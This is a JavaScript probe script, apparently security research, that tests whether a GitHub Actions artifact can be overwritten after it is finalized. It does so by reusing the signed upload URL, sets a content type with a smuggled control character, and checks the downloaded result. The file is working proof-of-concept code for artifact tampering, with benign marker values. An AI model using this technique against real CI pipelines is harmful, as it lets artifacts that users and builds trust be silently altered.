import { BlobClient } from '@azure/storage-blob';
import { internalArtifactTwirpClient } from './node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import { getBackendIdsFromToken } from './node_modules/@actions/artifact/lib/internal/shared/util.js';
import { StringValue } from './node_modules/@actions/artifact/lib/generated/index.js';

const client = internalArtifactTwirpClient({maxAttempts: 1});
const backend = getBackendIdsFromToken();
const name = `post-finalize-overwrite-${process.env.GITHUB_RUN_ID}.json`;
const placeholder = Buffer.from('{}');
const made = await client.CreateArtifact({
  ...backend,
  name,
  version: 7,
  mimeType: StringValue.create({value: 'application/octet-stream'}),
});
if (!made.ok) throw new Error('create-not-ok');
const block = new BlobClient(made.signedUploadUrl).getBlockBlobClient();
await block.uploadData(placeholder, {
  blobHTTPHeaders: {blobContentType: 'application/octet-stream'},
});
const done = await client.FinalizeArtifact({...backend, name, size: String(placeholder.length)});
if (!done.ok) throw new Error('finalize-not-ok');

const repository = `${process.env.GITHUB_REPOSITORY}/actions/artifacts/${done.artifactId}/zip`;
const finalBody = Buffer.from(JSON.stringify({
  full_name: repository,
  owner: {login: 'control', avatar_url: 'https://example.invalid/benign.png'},
  description: 'post-finalize-overwrite-marker',
  stargazers_count: 0,
}));
let overwrite = {ok: false};
try {
  const response = await block.uploadData(finalBody, {
    blobHTTPHeaders: {blobContentType: '\u0085application/json'},
  });
  overwrite = {ok: true, etagPresent: typeof response.etag === 'string'};
} catch (error) {
  overwrite = {ok: false, error: String(error?.message || error).slice(0, 180)};
}

const first = await fetch(
  `https://api.github.com/repos/${process.env.GITHUB_REPOSITORY}/actions/artifacts/${done.artifactId}/zip`,
  {
    headers: {
      Authorization: `Bearer ${process.env.GITHUB_TOKEN}`,
      Accept: 'application/vnd.github.v3+json',
      'User-Agent': 'repo-cassette-post-finalize-overwrite-probe',
    },
    redirect: 'manual',
  },
);
const location = first.headers.get('location');
const final = location ? await fetch(location) : first;
const bytes = Buffer.from(await final.arrayBuffer());
const finalType = final.headers.get('content-type') || '';
console.log('POST_FINALIZE_OVERWRITE_RESULT', JSON.stringify({
  artifactId: String(done.artifactId),
  overwrite,
  firstStatus: first.status,
  finalStatus: final.status,
  finalType,
  finalTypeCodePoints: Array.from(finalType, c => c.codePointAt(0)),
  bodyMatches: bytes.equals(finalBody),
  placeholderMatches: bytes.equals(placeholder),
  size: bytes.length,
}));
